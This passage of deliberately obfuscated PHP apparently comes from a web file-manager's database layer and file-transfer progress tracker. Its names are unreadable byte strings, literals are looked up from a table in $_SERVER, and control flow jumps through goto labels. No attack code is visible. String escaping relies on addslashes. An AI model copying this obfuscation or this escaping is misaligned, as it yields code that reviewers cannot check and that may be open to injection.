$…Êœ¬é®[1013] . $…Êœ¬é®[1014] . strtoupper($Á¢º•Ÿ‚) . $…Êœ¬é®[1015] . strtoupper($Á¢º•Ÿ‚) . $…Êœ¬é®[1016]; break; case $…Êœ¬é®[1017]: $Ë‡ü†©õ = $…Êœ¬é®[1018] . $Á¢º•Ÿ‚ . $…Êœ¬é®[1019]; break; case $…Êœ¬é®[992]: break; case $…Êœ¬é®[1020]: default: $Ë‡ü†©õ = $…Êœ¬é®[1021] . ($this->dbType == $…Êœ¬é®[1020] ? "\140{$Á¢º•Ÿ‚}\x60" : $Á¢º•Ÿ‚); } } $ÉÜ¨½÷¡ = $this->query($Ë‡ü†©õ); $——„²ƒ‚ = array(); if ($ÉÜ¨½÷¡) { foreach ($ÉÜ¨½÷¡ as $ı­‘ô€ => $ßœâöŸÏ) { $ßœâöŸÏ = array_change_key_case($ßœâöŸÏ); $ßœâöŸÏ[$…Êœ¬é®[32]] = isset($ßœâöŸÏ[$…Êœ¬é®[32]]) ? $ßœâöŸÏ[$…Êœ¬é®[32]] : $…Êœ¬é®[456]; $ßœâöŸÏ[$…Êœ¬é®[33]] = isset($ßœâöŸÏ[$…Êœ¬é®[33]]) ? $ßœâöŸÏ[$…Êœ¬é®[33]] : $…Êœ¬é®[456]; $öÔêè = isset($ßœâöŸÏ[$…Êœ¬é®[352]]) ? $ßœâöŸÏ[$…Êœ¬é®[352]] : $ßœâöŸÏ[$…Êœ¬é®[32]]; $——„²ƒ‚[$öÔêè] = array($…Êœ¬é®[32] => $öÔêè, $…Êœ¬é®[33] => $ßœâöŸÏ[$…Êœ¬é®[33]], $…Êœ¬é®[35] => (bool) (isset($ßœâöŸÏ[$…Êœ¬é®[106]]) && $ßœâöŸÏ[$…Êœ¬é®[106]] === $…Êœ¬é®[12] || isset($ßœâöŸÏ[$…Êœ¬é®[35]]) && $ßœâöŸÏ[$…Êœ¬é®[35]] === $…Êœ¬é®[12]), $…Êœ¬é®[37] => isset($ßœâöŸÏ[$…Êœ¬é®[37]]) ? $ßœâöŸÏ[$…Êœ¬é®[37]] : (isset($ßœâöŸÏ[$…Êœ¬é®[56]]) ? $ßœâöŸÏ[$…Êœ¬é®[56]] : $…Êœ¬é®[456]), $…Êœ¬é®[39] => isset($ßœâöŸÏ[$…Êœ¬é®[97]]) ? strtolower($ßœâöŸÏ[$…Êœ¬é®[97]]) == $…Êœ¬é®[41] : (isset($ßœâöŸÏ[$…Êœ¬é®[57]]) ? $ßœâöŸÏ[$…Êœ¬é®[57]] : !1), $…Êœ¬é®[42] => isset($ßœâöŸÏ[$…Êœ¬é®[1022]]) ? strtolower($ßœâöŸÏ[$…Êœ¬é®[1022]]) == $…Êœ¬é®[44] : (isset($ßœâöŸÏ[$…Êœ¬é®[97]]) ? $ßœâöŸÏ[$…Êœ¬é®[97]] : !1)); } } return $——„²ƒ‚; } public function getTables($ÑÜº»ˆ = '') { $ãÃ“Ş² =& $_SERVER[°‰†òö¯]; if (think_config($ãÃ“Ş²[1023])) { $ƒïÔñÕ = str_replace($ãÃ“Ş²[1024], $ÑÜº»ˆ, think_config($ãÃ“Ş²[1023])); } else { switch ($this->dbType) { case $ãÃ“Ş²[991]: case $ãÃ“Ş²[993]: $ƒïÔñÕ = $ãÃ“Ş²[1025]; break; case $ãÃ“Ş²[990]: case $ãÃ“Ş²[1008]: $ƒïÔñÕ = $ãÃ“Ş²[1026]; break; case $ãÃ“Ş²[1017]: $ƒïÔñÕ = $ãÃ“Ş²[1027]; break; case $ãÃ“Ş²[992]: think_exception(think_lang($ãÃ“Ş²[1028]) . $ãÃ“Ş²[1029]); break; case $ãÃ“Ş²[1009]: $ƒïÔñÕ = $ãÃ“Ş²[45] . $ãÃ“Ş²[46] . $ãÃ“Ş²[47]; break; case $ãÃ“Ş²[1020]: default: if (!empty($ÑÜº»ˆ)) { $ƒïÔñÕ = $ãÃ“Ş²[972] . $ÑÜº»ˆ . $ãÃ“Ş²[973]; } else { $ƒïÔñÕ = $ãÃ“Ş²[974]; } } } $½Î„ = $this->query($ƒïÔñÕ); $Á§øá‰ = array(); foreach ($½Î„ as $—±ôÄ¢´ => $Æ™íÃŠ) { $Á§øá‰[$—±ôÄ¢´] = current($Æ™íÃŠ); } return $Á§øá‰; } protected function parseLimit($İâº¯œÀ) { $ç«ø³­« =& $_SERVER[°‰†òö¯]; $Â‹¿©… = $ç«ø³­«[12]; if (!empty($İâº¯œÀ)) { switch ($this->dbType) { case $ç«ø³­«[1017]: case $ç«ø³­«[1009]: $İâº¯œÀ = explode($ç«ø³­«[50], $İâº¯œÀ); if (count($İâº¯œÀ) > 1) { $Â‹¿©… .= $ç«ø³­«[51] . $İâº¯œÀ[1] . $ç«ø³­«[52] . $İâº¯œÀ[0] . $ç«ø³­«[53]; } else { $Â‹¿©… .= $ç«ø³­«[51] . $İâº¯œÀ[0] . $ç«ø³­«[53]; } break; case $ç«ø³­«[990]: case $ç«ø³­«[1008]: break; case $ç«ø³­«[992]: break; case $ç«ø³­«[991]: case $ç«ø³­«[993]: break; case $ç«ø³­«[1020]: default: $Â‹¿©… .= $ç«ø³­«[51] . $İâº¯œÀ . $ç«ø³­«[53]; } } return $Â‹¿©…; } public function parseKey(&$È†®¬§ï, $¥¹°ıŸ = true) { $©¯ÓêÍ‹ =& $_SERVER[°‰†òö¯]; if ($¥¹°ıŸ) { $È†®¬§ï = $this->parseKeyCheck($È†®¬§ï); } if ($this->dbType == $©¯ÓêÍ‹[1020]) { if ($È†®¬§ï != $©¯ÓêÍ‹[222] && !preg_match($©¯ÓêÍ‹[984], $È†®¬§ï)) { $È†®¬§ï = $©¯ÓêÍ‹[463] . trim($È†®¬§ï, $©¯ÓêÍ‹[463]) . $©¯ÓêÍ‹[463]; } return $È†®¬§ï; } else { return parent::parseKey($È†®¬§ï, $¥¹°ıŸ); } } public function close() { $this->_linkID = null; } public function error() { $Î†©›Óˆ =& $_SERVER[°‰†òö¯]; if ($this->PDOStatement) { $ÅÏÖ¸–Ö = $this->PDOStatement->errorInfo(); $this->error = $ÅÏÖ¸–Ö[1] . $Î†©›Óˆ[4] . $ÅÏÖ¸–Ö[2]; } else { $this->error = $Î†©›Óˆ[12]; } if ($Î†©›Óˆ[12] != $this->queryStr) { $this->error .= LNG($Î†©›Óˆ[48]) . $this->queryStr; } think_trace($this->error, $Î†©›Óˆ[12], $Î†©›Óˆ[49]); return $this->error; } public function escapeString($Ö¹˜–„Ş) { $ïÀó—¢ =& $_SERVER[°‰†òö¯]; switch ($this->dbType) { case $ïÀó—¢[1017]: case $ïÀó—¢[990]: case $ïÀó—¢[1008]: case $ïÀó—¢[1020]: return addslashes($Ö¹˜–„Ş); case $ïÀó—¢[992]: case $ïÀó—¢[1009]: case $ïÀó—¢[991]: case $ïÀó—¢[993]: return str_ireplace($ïÀó—¢[58], $ïÀó—¢[59], $Ö¹˜–„Ş); } } protected function parseValue($¾…îÅ€¤) { $ıŒ¿­‚Ş =& $_SERVER[°‰†òö¯]; if (is_string($¾…îÅ€¤)) { $é¢›¼ñ = strpos($¾…îÅ€¤, $ıŒ¿­‚Ş[4]) === 0 && in_array($¾…îÅ€¤, array_keys($this->bind)); $¾…îÅ€¤ = $é¢›¼ñ ? $this->escapeString($¾…îÅ€¤) : $ıŒ¿­‚Ş[1030] . $this->escapeString($¾…îÅ€¤) . $ıŒ¿­‚Ş[1030]; } elseif (isset($¾…îÅ€¤[0]) && is_string($¾…îÅ€¤[0]) && strtolower($¾…îÅ€¤[0]) == $ıŒ¿­‚Ş[374]) { $¾…îÅ€¤ = $this->escapeString($¾…îÅ€¤[1]); } elseif (is_array($¾…îÅ€¤)) { $¾…îÅ€¤ = array_map(array($this, $ıŒ¿­‚Ş[1031]), $¾…îÅ€¤); } elseif (is_bool($¾…îÅ€¤)) { $¾…îÅ€¤ = $¾…îÅ€¤ ? $ıŒ¿­‚Ş[91] : $ıŒ¿­‚Ş[230]; } elseif (is_null($¾…îÅ€¤)) { $¾…îÅ€¤ = $ıŒ¿­‚Ş[106]; } return $¾…îÅ€¤; } public function getLastInsertId() { $¾ÓœÁµ =& $_SERVER[°‰†òö¯]; switch ($this->dbType) { case $¾ÓœÁµ[1017]: case $¾ÓœÁµ[1009]: case $¾ÓœÁµ[990]: case $¾ÓœÁµ[1008]: case $¾ÓœÁµ[992]: case $¾ÓœÁµ[1020]: return $this->_linkID->lastInsertId(); case $¾ÓœÁµ[991]: case $¾ÓœÁµ[993]: $êšİòÜ = $this->table; $œÅŸöèÖ = $this->query("\123\x45\x4c\105\x43\x54\x20{$êšİòÜ}\56\143\165\x72\x72\x76\141\x6c\40\x63\x75\x72\x72\x76\x61\x6c\40\106\x52\117\x4d\40\144\165\141\154"); return $œÅŸöèÖ ? $œÅŸöèÖ[0][$¾ÓœÁµ[1032]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ŞÜ…¡ÌÆ) { $è…åüÚñ =& $_SERVER[°‰†òö¯]; if (!CacheLock::fileLock($è…åüÚñ[13])) { return !1; } $³–¸üÒ = parent::query($ŞÜ…¡ÌÆ); CacheLock::fileUnLock($è…åüÚñ[13]); return $³–¸üÒ; } public function execute($©·÷¢¡õ) { $îÄûô½¦ =& $_SERVER[°‰†òö¯]; if (!CacheLock::fileLock($îÄûô½¦[13])) { return !1; } $Í…„Ÿ¢ı = parent::execute($©·÷¢¡õ); CacheLock::fileUnLock($îÄûô½¦[13]); return $Í…„Ÿ¢ı; } } class DbSqlite3 extends DbSqlite3Base { public function query($àµ¶‡ò‰) { $ğØ‹Ïóó =& $_SERVER[°‰†òö¯]; if (!CacheLock::fileLock($ğØ‹Ïóó[13])) { return !1; } $µïª®¨ş = parent::query($àµ¶‡ò‰); CacheLock::fileUnLock($ğØ‹Ïóó[13]); return $µïª®¨ş; } public function execute($ïÛÓıŒ¯) { $©Á‚µÌä =& $_SERVER[°‰†òö¯]; if (!CacheLock::fileLock($©Á‚µÌä[13])) { return !1; } $ØÆ„´ı¼ = parent::execute($ïÛÓıŒ¯); CacheLock::fileUnLock($©Á‚µÌä[13]); return $ØÆ„´ı¼; } } goto Fãœ¹ƒØ‘; AËÖ“ˆ‘®: function binCheckBigger($ûíœ÷êÙ, $¹¹‚ÔÍ«) { return $ûíœ÷êÙ > $¹¹‚ÔÍ«; } $_SERVER[$_SERVER[É¶É–øÑ][3]] = ("\70\66\62\60"."\66\64")+0;$_h102="1r49g3t8a2mdnh6kywobipz75fjcxu0qlsevudselai8hc5opjvqtxwfkry2m7bz3g469n103odncfu4bg";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ïƒ¤±, $çÎšëù£) { $áøæıÂä =& $_SERVER[°‰†òö¯]; if (isset(self::$_methodList[$ïƒ¤±])) { return @call_user_func_array(self::$_methodList[$ïƒ¤±], $çÎšëù£); } else { if (method_exists($this, $ïƒ¤±)) { return call_user_func_array(array($this, $ïƒ¤±), $çÎšëù£); } else { think_exception(__CLASS__ . $áøæıÂä[4] . $ïƒ¤± . $áøæıÂä[5]); } } } public static function __callStatic($¥—Í‚ğé, $ñĞ¥Ë‰š) { if (isset(self::$_methodListStatic[$¥—Í‚ğé])) { return call_user_func_array(self::$_methodListStatic[$¥—Í‚ğé], $ñĞ¥Ë‰š); } else { if (method_exists(self, $¥—Í‚ğé)) { return call_user_func_array(array(self, $¥—Í‚ğé), $ñĞ¥Ë‰š); } else { show_json("{$¥—Í‚ğé}\50\51\40\x6e\x6f\x74\x20\145\x78\x69\x73\x74\73", !1); } } } public static function addMethod($ü“–ô´”, $‘’‘®ëÃ) { self::$_methodList[$ü“–ô´”] = $‘’‘®ëÃ; } public static function addMethodStatic($ˆÁÑ”«, $ ³ÜÚ²˜) { self::$_methodListStatic[$ˆÁÑ”«] = $ ³ÜÚ²˜; } } goto Fä¿È¸£½¿; aˆœÃîšÏ: class TaskFileTransfer extends Task { protected function startAfter() { $Ÿ¼ß¼ßÜ =& $_SERVER[°‰†òö¯]; $Ï ­‡Â” =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ÿ¼ß¼ßÜ[1802], array($this, $Ÿ¼ß¼ßÜ[1803])); Hook::bind($Ÿ¼ß¼ßÜ[1306], array($this, $Ÿ¼ß¼ßÜ[1804])); Hook::bind($Ÿ¼ß¼ßÜ[1805], array($this, $Ÿ¼ß¼ßÜ[1806])); Hook::bind($Ÿ¼ß¼ßÜ[675], array($this, $Ÿ¼ß¼ßÜ[1807])); Hook::bind($Ÿ¼ß¼ßÜ[676], array($this, $Ÿ¼ß¼ßÜ[1808])); Hook::bind($Ÿ¼ß¼ßÜ[682], array($this, $Ÿ¼ß¼ßÜ[1809])); Hook::bind($Ÿ¼ß¼ßÜ[683], array($this, $Ÿ¼ß¼ßÜ[1810])); Hook::bind($Ÿ¼ß¼ßÜ[678], array($this, $Ÿ¼ß¼ßÜ[1811])); Hook::bind($Ÿ¼ß¼ßÜ[680], array($this, $Ÿ¼ß¼ßÜ[1812])); Hook::bind($Ÿ¼ß¼ßÜ[644], array($this, $Ÿ¼ß¼ßÜ[1813])); Hook::bind($Ÿ¼ß¼ßÜ[641], array($this, $Ÿ¼ß¼ßÜ[1813])); Hook::bind($Ÿ¼ß¼ßÜ[646], array($this, $Ÿ¼ß¼ßÜ[1813])); Hook::bind($Ÿ¼ß¼ßÜ[648], array($this, $Ÿ¼ß¼ßÜ[1813])); Hook::bind($Ÿ¼ß¼ßÜ[650], array($this, $Ÿ¼ß¼ßÜ[1813])); Hook::bind($Ÿ¼ß¼ßÜ[1814], array($this, $Ÿ¼ß¼ßÜ[1815])); Hook::bind($Ÿ¼ß¼ßÜ[666], array($this, $Ÿ¼ß¼ßÜ[1816])); $this->sourceModelCopyFlag = !1; Hook::bind($Ÿ¼ß¼ßÜ[1817], array($this, $Ÿ¼ß¼ßÜ[1818])); Hook::bind($Ÿ¼ß¼ßÜ[1819], array($this, $Ÿ¼ß¼ßÜ[1820])); Hook::bind($Ÿ¼ß¼ßÜ[1821], array($this, $Ÿ¼ß¼ßÜ[1822])); $Ï ­‡Â”[$Ÿ¼ß¼ßÜ[1823]] = LNG($Ÿ¼ß¼ßÜ[1824]); $Ï ­‡Â”[$Ÿ¼ß¼ßÜ[1825]] = 0; $Ï ­‡Â”[$Ÿ¼ß¼ßÜ[1826]] = 0; $Ï ­‡Â”[$Ÿ¼ß¼ßÜ[1140]] = $Ÿ¼ß¼ßÜ[12]; $Ï ­‡Â”[$Ÿ¼ß¼ßÜ[1827]] = $Ÿ¼ß¼ßÜ[12]; $Ï ­‡Â”[$Ÿ¼ß¼ßÜ[1828]] = 0; $Ï ­‡Â”[$Ÿ¼ß¼ßÜ[1829]] = 0; $Ï ­‡Â”[$Ÿ¼ß¼ßÜ[1830]] = 0; if (!$Ï ­‡Â”[$Ÿ¼ß¼ßÜ[1659]]) { $Ï ­‡Â”[$Ÿ¼ß¼ßÜ[1659]] = LNG($Ÿ¼ß¼ßÜ[1831]); } } protected function endAfter() { $×ğ×Äö… =& $_SERVER[°‰†òö¯]; Hook::unbind($×ğ×Äö…[1802], array($this, $×ğ×Äö…[1803])); Hook::unbind($×ğ×Äö…[1306], array($this, $×ğ×Äö…[1804])); Hook::unbind($×ğ×Äö…[1805], array($this, $×ğ×Äö…[1806])); Hook::unbind($×ğ×Äö…[675], array($this, $×ğ×Äö…[1807])); Hook::unbind($×ğ×Äö…[676], array($this, $×ğ×Äö…[1808])); Hook::unbind($×ğ×Äö…[682], array($this, $×ğ×Äö…[1809])); Hook::unbind($×ğ×Äö…[683], array($this, $×ğ×Äö…[1810])); Hook::unbind($×ğ×Äö…[678], array($this, $×ğ×Äö…[1811])); Hook::unbind($×ğ×Äö…[680], array($this, $×ğ×Äö…[1812])); Hook::unbind($×ğ×Äö…[644], array($this, $×ğ×Äö…[1813])); Hook::unbind($×ğ×Äö…[641], array($this, $×ğ×Äö…[1813])); Hook::unbind($×ğ×Äö…[646], array($this, $×ğ×Äö…[1813])); Hook::unbind($×ğ×Äö…[648], array($this, $×ğ×Äö…[1813])); Hook::unbind($×ğ×Äö…[650], array($this, $×ğ×Äö…[1813])); Hook::unbind($×ğ×Äö…[1814], array($this, $×ğ×Äö…[1815])); Hook::unbind($×ğ×Äö…[666], array($this, $×ğ×Äö…[1816])); Hook::unbind($×ğ×Äö…[1817], array($this, $×ğ×Äö…[1818])); Hook::unbind($×ğ×Äö…[1819], array($this, $×ğ×Äö…[1820])); Hook::unbind($×ğ×Äö…[1821], array($this, $×ğ×Äö…[1822])); } public function copyMoveStart($È•ñú†, $õá‡©Œ, $ışŞÎ¶Ø, $Æûï¶÷) { $¸‰¼¼óê =& $_SERVER[°‰†òö¯]; self::log($¸‰¼¼óê[1832] . $õá‡©Œ . $¸‰¼¼óê[73] . $Æûï¶÷); $±à’Á±ô = rtrim(TEMP_FILES, $¸‰¼¼óê[8]); if (substr($õá‡©Œ, 0, strlen($±à’Á±ô)) == $±à’Á±ô) { return; } if (substr($Æûï¶÷, 0, strlen($±à’Á±ô)) == $±à’Á±ô) { return; } $™É’‡Ğí =& $this->task; $™É’‡Ğí[$¸‰¼¼óê[1833]] = KodIO::transferType($È•ñú†, $ışŞÎ¶Ø); $this->update(); } public function updateAfter() { $Äî®Ì—¸ =& $_SERVER[°‰†òö¯]; $üåòé¹… =& $this->task; if (!$üåòé¹…[$Äî®Ì—¸[824]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($üåòé¹…[$Äî®Ì—¸[1833]] == $Äî®Ì—¸[1400]) { return; } self::updateTask($üåòé¹…); } private static function updateTask(&$±õë˜ã¾) { $¯Ñ™¨ïÈ =& $_SERVER[°‰†òö¯]; if ($±õë˜ã¾[$¯Ñ™¨ïÈ[1833]] == $¯Ñ™¨ïÈ[1277] || $±õë˜ã¾[$¯Ñ™¨ïÈ[1833]] == $¯Ñ™¨ïÈ[110]) { if ($±õë˜ã¾[$¯Ñ™¨ïÈ[1827]]) { $±õë˜ã¾[$¯Ñ™¨ïÈ[1830]] = $±õë˜ã¾[$¯Ñ™¨ïÈ[1829]] + $±õë˜ã¾[$¯Ñ™¨ïÈ[1826]]; } } else { if ($±õë˜ã¾[$¯Ñ™¨ïÈ[1833]] == $¯Ñ™¨ïÈ[1401]) { if ($±õë˜ã¾[$¯Ñ™¨ïÈ[1827]] == $¯Ñ™¨ïÈ[1277]) { $±õë˜ã¾[$¯Ñ™¨ïÈ[1830]] = $±õë˜ã¾[$¯Ñ™¨ïÈ[1829]] + $±õë˜ã¾[$¯Ñ™¨ïÈ[1826]] * 0.5; } else { if ($±õë˜ã¾[$¯Ñ™¨ïÈ[1827]] == $¯Ñ™¨ïÈ[110]) { $±õë˜ã¾[$¯Ñ™¨ïÈ[1830]] = $±õë˜ã¾[$¯Ñ™¨ïÈ[1829]] + $±õë˜ã¾[$¯Ñ™¨ïÈ[1825]] * 0.5 + $±õë˜ã¾[$¯Ñ™¨ïÈ[1826]] * 0.5; } } } } $±õë˜ã¾[$¯Ñ™¨ïÈ[1773]] = $±õë˜ã¾[$¯Ñ™¨ïÈ[1830]] / $±õë˜ã¾[$¯Ñ™¨ïÈ[824]]; if ($±õë˜ã¾[$¯Ñ™¨ïÈ[1773]] > 0) { $ÆÊØËÜ = timeFloat() - $±õë˜ã¾[$¯Ñ™¨ïÈ[1775]] - $±õë˜ã¾[$¯Ñ™¨ïÈ[1778]]; $±õë˜ã¾[$¯Ñ™¨ïÈ[1779]] = $ÆÊØËÜ * (1 - $±õë˜ã¾[$¯Ñ™¨ïÈ[1773]]) / $±õë˜ã¾[$¯Ñ™¨ïÈ[1773]]; } } public function addPath($ƒÃû²ü—) { $‰ôı·±· =& $_SERVER[°‰†òö¯]; if (!$ƒÃû²ü—) { return; } $Ààå´œñ =& $this->task; $ÈìùøéŒ = IO::infoWithChildren($ƒÃû²ü—); $±Íşİ‰° = $Ààå´œñ[$‰ôı·±·[1834]] ? $Ààå´œñ[$‰ôı·±·[1834]][$‰ôı·±·[1835]] : 0; $Ààå´œñ[$‰ôı·±·[1834]] = array($‰ôı·±·[1835] => $±Íşİ‰° + 1, $‰ôı·±·[496] => $ÈìùøéŒ[$‰ôı·±·[32]], $‰ôı·±·[87] => $ÈìùøéŒ[$‰ôı·±·[87]], $‰ôı·±·[586] => $ÈìùøéŒ[$‰ôı·±·[586]] ? $ÈìùøéŒ[$‰ôı·±·[586]] : $ÈìùøéŒ[$‰ôı·±·[87]]); if ($ÈìùøéŒ[$‰ôı·±·[33]] == $‰ôı·±·[232]) { $Ààå´œñ[$‰ôı·±·[1138]] += 1; } else { $Ààå´œñ[$‰ôı·±·[1138]] += $ÈìùøéŒ[$‰ôı·±·[82]][$‰ôı·±·[80]]; if ($ÈìùøéŒ[$‰ôı·±·[193]]) { $Ààå´œñ[$‰ôı·±·[1138]] += $ÈìùøéŒ[$‰ôı·±·[82]][$‰ôı·±·[81]] + 1; } } $Ààå´œñ[$‰ôı·±·[824]] += $ÈìùøéŒ[$‰ôı·±·[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ğúŞš³Ú) { } public function sourceAddHashEnd($ëŸç×—ô) { } public function sourceAddFileStart($¦¿‹åâ) { $çè­¦âİ =& $_SERVER[°‰†òö¯]; $€äÍËì =& $this->task; $€äÍËì[$çè­¦âİ[1825]] = $¦¿‹åâ[$çè­¦âİ[79]]; $€äÍËì[$çè­¦âİ[1823]] = $¦¿‹åâ[$çè­¦âİ[32]]; $€äÍËì[$çè­¦âİ[1140]] = $¦¿‹åâ[$çè­¦âİ[32]]; $€äÍËì[$çè­¦âİ[1836]] = $¦¿‹åâ[$çè­¦âİ[87]]; $this->update(); } public function sourceAddFileEnd($İ™•×) { $¼è­¯÷Ú =& $_SERVER[°‰†òö¯]; $¥¼•Ù… =& $this->task; $¥¼•Ù…[$¼è­¯÷Ú[1830]] += $İ™•×[$¼è­¯÷Ú[79]]; $¥¼•Ù…[$¼è­¯÷Ú[1836]] = $İ™•×[$¼è­¯÷Ú[87]]; $this->update(1); } public function copyFileStart($°¬ êê½, $ƒ÷À£µø, $Í²ÕîÊœ, $è‚–è˜×, $ı®Î Ø—, $¯îÜ¹÷) { $ÉÑçıêó =& $_SERVER[°‰†òö¯]; $ˆ¨öå£‚ = $ı®Î Ø—; if ($ˆ¨öå£‚ == $GLOBALS[$ÉÑçıêó[1837]]) { $ˆ¨öå£‚ = $GLOBALS[$ÉÑçıêó[1838]]; } $GLOBALS[$ÉÑçıêó[1838]] = $ı®Î Ø—; $GLOBALS[$ÉÑçıêó[1837]] = $¯îÜ¹÷; $‚¾èèÛà =& $this->task; $‚¾èèÛà[$ÉÑçıêó[1823]] = $ˆ¨öå£‚; $‚¾èèÛà[$ÉÑçıêó[1825]] = (int) $°¬ êê½->size($ƒ÷À£µø); $‚¾èèÛà[$ÉÑçıêó[1826]] = 0; $‚¾èèÛà[$ÉÑçıêó[1140]] = $ÉÑçıêó[12]; $‚¾èèÛà[$ÉÑçıêó[1827]] = $ÉÑçıêó[12]; $‚¾èèÛà[$ÉÑçıêó[1828]] = 0; $æıšş‘ = $‚¾èèÛà[$ÉÑçıêó[1825]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($‚¾èèÛà[$ÉÑçıêó[477]] . $ÉÑçıêó[1839]); if ($æıšş‘ && file_exists(get_path_father($è‚–è˜×))) { Cache::set($‚¾èèÛà[$ÉÑçıêó[477]] . $ÉÑçıêó[1839], $è‚–è˜×); $‚¾èèÛà[$ÉÑçıêó[1796]] = array($ÉÑçıêó[1840], $ÉÑçıêó[1841]); } $this->update(0, $æıšş‘); } public static function updateCopyLocalFileSize($²™÷½ü) { $©›—Ê©È =& $_SERVER[°‰†òö¯]; $€ÈÀŞ¯ = Cache::get($²™÷½ü[$©›—Ê©È[477]] . $©›—Ê©È[1839]); if (!$€ÈÀŞ¯ || !file_exists($€ÈÀŞ¯)) { return $²™÷½ü; } $²™÷½ü[$©›—Ê©È[1826]] = @filesize($€ÈÀŞ¯); $²™÷½ü[$©›—Ê©È[1830]] += $²™÷½ü[$©›—Ê©È[1826]]; self::updateTask($²™÷½ü); return $²™÷½ü; } public function copyFileEnd($üæŞ×ÖÇ, $Ğ…¾‚šø, $İ½ßàÔ‰, $³Ï•­Şú, $Ù¤ıëõÒ, $±ÉÉïÛ) { $‰ç¼‰‚ë =& $_SERVER[°‰†òö¯]; $£˜´ş ¾ =& $this->task; $£˜´ş ¾[$‰ç¼‰‚ë[1826]] = $£˜´ş ¾[$‰ç¼‰‚ë[1825]]; $£˜´ş ¾[$‰ç¼‰‚ë[1827]] = $‰ç¼‰‚ë[12]; unset($£˜´ş ¾[$‰ç¼‰‚ë[1796]]); if ($Ù¤ıëõÒ == $£˜´ş ¾[$‰ç¼‰‚ë[1823]]) { $£˜´ş ¾[$‰ç¼‰‚ë[1829]] += $£˜´ş ¾[$‰ç¼‰‚ë[1825]]; $£˜´ş ¾[$‰ç¼‰‚ë[1830]] = $£˜´ş ¾[$‰ç¼‰‚ë[1829]]; $Íºê¢ = 1; if (isset($£˜´ş ¾[$‰ç¼‰‚ë[1836]]) && $£˜´ş ¾[$‰ç¼‰‚ë[1836]] == $Ğ…¾‚šø) { $Íºê¢ = 0; } $this->update($Íºê¢); } else { $this->update(); $£˜´ş ¾[$‰ç¼‰‚ë[1826]] = 0; } Cache::remove($£˜´ş ¾[$‰ç¼‰‚ë[477]] . $‰ç¼‰‚ë[1839]); self::log($‰ç¼‰‚ë[1842] . $Ğ…¾‚šø . $‰ç¼‰‚ë[73] . $³Ï•­Şú . $‰ç¼‰‚ë[287] . $Ù¤ıëõÒ . $‰ç¼‰‚ë[1843] . $£˜´ş ¾[$‰ç¼‰‚ë[1823]]); } public function updateFileEnd($Ûã¼ü¬, $©¶‚¡àË) { $ç£ÊŞİ =& $_SERVER[°‰†òö¯]; $š˜ƒ‘¸… =& $this->task; $š˜ƒ‘¸…[$ç£ÊŞİ[1823]] = $Ûã¼ü¬; $š˜ƒ‘¸…[$ç£ÊŞİ[1825]] = $©¶‚¡àË; $š˜ƒ‘¸…[$ç£ÊŞİ[1829]] += $©¶‚¡àË; $š˜ƒ‘¸…[$ç£ÊŞİ[1830]] = $š˜ƒ‘¸…[$ç£ÊŞİ[1829]]; $this->update(1); self::log($ç£ÊŞİ[1844] . $Ûã¼ü¬); } public function sourceModelCopy($íí–Î´) { $Ú™…¢× =& $_SERVER[°‰†òö¯]; $ÄåŞâÛ¬ = $íí–Î´[0]; $Õ½ê‚Ñ = $íí–Î´[1]; $Úİ¿õ„‡ =& $this->task; $this->sourceModelCopyFlag = !0; $–†ƒËœÆ = 0; switch ($ÄåŞâÛ¬) { case $Ú™…¢×[642]: $–†ƒËœÆ = 1; break; case $Ú™…¢×[645]: $Úİ¿õ„‡[$Ú™…¢×[1823]] = $Õ½ê‚Ñ[$Ú™…¢×[32]]; break; case $Ú™…¢×[647]: $–†ƒËœÆ = intval($íí–Î´[$Ú™…¢×[458]] * 0.4); break; case $Ú™…¢×[649]: $–†ƒËœÆ = intval($íí–Î´[$Ú™…¢×[458]] * 0.2); break; case $Ú™…¢×[651]: $–†ƒËœÆ = intval($íí–Î´[$Ú™…¢×[458]] * 0.4); break; } $this->update($–†ƒËœÆ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($éÔĞÑöÃ, $¥ˆ «Ï) { $“³’âÒÉ =& $_SERVER[°‰†òö¯]; $this->sourceModelCopyFlag = !0; $ç¾µİ‹Ò = 1; if (isset($éÔĞÑöÃ[$“³’âÒÉ[82]])) { $ç¾µİ‹Ò = $éÔĞÑöÃ[$“³’âÒÉ[82]][$“³’âÒÉ[80]]; $ç¾µİ‹Ò = $ç¾µİ‹Ò + $éÔĞÑöÃ[$“³’âÒÉ[82]][$“³’âÒÉ[81]] + 1; } $this->update($ç¾µİ‹Ò); $this->sourceModelCopyFlag = !1; } public function sourceMove($ªÛØ‹²œ) { $this->sourceRemove($ªÛØ‹²œ, !1); } public function curlProgress($ƒ¸¬øîÈ, $Ğ½·œ , $®‚á—ññ, $®úôÓôø, $şåŸ­ë¸) { $¾ô¯»Ú =& $_SERVER[°‰†òö¯]; $ğÏä¶ˆÀ =& $this->task; if ($şåŸ­ë¸ > 0) { $ğÏä¶ˆÀ[$¾ô¯»Ú[1140]] = $¾ô¯»Ú[1845]; $ğÏä¶ˆÀ[$¾ô¯»Ú[1827]] = $¾ô¯»Ú[110]; if ($ğÏä¶ˆÀ[$¾ô¯»Ú[1825]]) { $ğÏä¶ˆÀ[$¾ô¯»Ú[1826]] = $şåŸ­ë¸; } if ($ğÏä¶ˆÀ[$¾ô¯»Ú[1828]]) { $ğÏä¶ˆÀ[$¾ô¯»Ú[1826]] = $şåŸ­ë¸ + $ğÏä¶ˆÀ[$¾ô¯»Ú[1828]]; } } else { if ($®‚á—ññ > 0) { if ($ğÏä¶ˆÀ[$¾ô¯»Ú[1825]] == $Ğ½·œ ) { $ğÏä¶ˆÀ[$¾ô¯»Ú[1826]] = $®‚á—ññ; $ğÏä¶ˆÀ[$¾ô¯»Ú[1140]] = $¾ô¯»Ú[1846]; $ğÏä¶ˆÀ[$¾ô¯»Ú[1827]] = $¾ô¯»Ú[1277]; } } } $this->update(); } public function curlProgressStart($ã‘Üë¸™) { } public function curlProgressEnd($ä®Ú—±) { $Úú£‘éƒ =& $_SERVER[°‰†òö¯]; $™š—Œëş =& $this->task; $úË˜áÑÜ = curl_getinfo($ä®Ú—±); $¢Û¢“ï² = $úË˜áÑÜ[$Úú£‘éƒ[1847]]; if ($¢Û¢“ï² == -1) { 